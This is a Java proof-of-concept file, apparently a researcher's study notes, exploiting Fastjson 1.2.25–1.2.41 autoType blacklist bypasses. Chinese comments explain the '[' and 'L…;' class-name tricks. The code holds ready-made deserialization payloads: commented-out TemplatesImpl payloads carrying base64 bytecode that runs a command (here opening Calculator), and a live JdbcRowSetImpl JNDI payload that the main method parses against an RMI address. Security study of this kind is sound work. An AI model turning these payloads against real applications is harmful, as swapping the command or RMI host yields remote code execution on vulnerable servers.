package Fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/11 21:10
 */
public class Fastjson1225 {
    public static void main(String[] args) {
        /*
        Fastjson1.2.25-1.2.41版本，发现会报错：autoType is not support.

        FreeBuf大佬写好的流程：
        autoTypeSupport为false:
            从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer
            然后进行黑白名单匹配
            最后抛出JSONException异常，autoType is not support.~
        autoTypeSupport为true：
            进行黑白名单匹配
            从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer
            然后调用TypeUtils.loadClass(typeName, this.defaultClassLoader);加载这个类

        自己分析：
        com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法，使用白名单和黑名单机制进行过滤
        查看源码发现，首先判断if(autoTypeSupport || expectClass != null)
        如果为真，那么就遍历白名单acceptList，看我们要转化的类是不是以白名单开头。
        如果是就进入TypeUtils.loadClass()，加载类；如果不是，就遍历黑名单进行拦截
        TypeUtils.loadClass()会依次看类名是不是以[和L开头。
        1. [开头的话，会执行Class<?> componentType = loadClass(className.substring(1), classLoader);
        随后Array.newInstance(componentType, 0).getClass();这里后续分析一下吧，根据报错感觉是应该把所有信息放在一个""里
        2. L开头;结尾的话，就会去除首尾，随后loadClass(newClassName, classLoader)
         */


        /*
        TemplatesImpl链子
         */
        //这是使用的[进行绕过，需要在@type前加[，在@type结束后立刻加[，在,"_bytecodes前部加上[,{，变成[,{"_bytecodes
        //@type后紧跟[代表数组，以{开头表示数组中的一个元素，多少个{表示数组有多少个元素
//        String payload = "{\"@type\":\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[,{\"_bytecodes\":[\"yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACQAKBwAhDAAiACMBABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABtTZXJpYWxpemF0aW9uL0Zhc3Rqc29uL0NhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAABAAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABwADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAhAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABMACQAWAAwAFAANABUAEQAXABMAAAAHAAJMBwAUBAABABUAAAACABY=\n\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\"}";

        //这是使用的L;进行绕过
//        String payload = "{\"@type\":\"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\"_bytecodes\":[\"yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACQAKBwAhDAAiACMBABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABtTZXJpYWxpemF0aW9uL0Zhc3Rqc29uL0NhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAABAAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABwADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAhAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABMACQAWAAwAFAANABUAEQAXABMAAAAHAAJMBwAUBAABABUAAAACABY=\n\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\"}";
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        JSON.parse(payload, Feature.SupportNonPublicField);


        /*
        JdbcRowSetImpl链子
         */
        //这是使用的L;进行绕过
//        String payload2 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";

        //使用[进行绕过，与TemplatesImpl链子一样
        String payload2 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload2);


    }
}
